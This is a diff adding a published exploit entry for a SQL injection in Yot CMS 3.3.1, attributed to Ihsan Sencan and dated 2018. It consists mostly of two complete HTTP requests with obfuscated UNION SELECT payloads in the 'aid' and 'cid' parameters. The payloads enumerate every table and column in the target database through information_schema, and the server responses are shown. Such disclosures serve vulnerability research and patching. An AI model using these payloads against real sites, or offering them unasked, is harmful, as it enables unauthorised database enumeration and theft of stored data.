@@ -1,0 +1,58 @@
+# Exploit Title: Yot CMS 3.3.1 - 'aid' SQL Injection
+# Dork: N/A
+# Date: 2018-11-01
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://yot.sourceforge.io/
+# Software Link: https://ayera.dl.sourceforge.net/project/yot/Yot%203.3.1.zip
+# Version: 3.3.1
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/index.php?page=articles&op=art&aid=[SQL]
+# 
+GET /[PATH]/index.php?page=articles&op=art&aid=1++uniON+SElEcT++++0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c(select(@x)from(select(@x:=0x00),(@running_number:=0),(@tbl:=0x00),(selEct(0)frOm(information_schema.COlumns)where(table_schema=database())and(0x00)in(@x:=Concat(@x,0x3c62723e,if((@tbl!=table_name),Concat(0x3c2f6469763e,LPAD(@running_number:=@running_number%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e),%200x00),lpad(@z:=@z%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d626c75653e,column_name,0x3c2f666f6e743e))))x)--+- HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Thu, 01 Nov 2018 23:21:17 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Set-Cookie: PHPSESSID=eatkahgi05mbjht042ipvtifp5; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/index.php?page=articles&op=cat&cid=[SQL]
+# 
+GET /[PATH]/index.php?page=articles&op=cat&cid=1++uniON+SElEcT++++0x496873616e%2c(select(@x)from(select(@x:=0x00),(@running_number:=0),(@tbl:=0x00),(selEct(0)frOm(information_schema.COlumns)where(table_schema=database())and(0x00)in(@x:=Concat(@x,0x3c62723e,if((@tbl!=table_name),Concat(0x3c2f6469763e,LPAD(@running_number:=@running_number%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e),%200x00),lpad(@z:=@z%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d626c75653e,column_name,0x3c2f666f6e743e))))x)--+- HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=eatkahgi05mbjht042ipvtifp5
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Thu, 01 Nov 2018 23:32:28 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
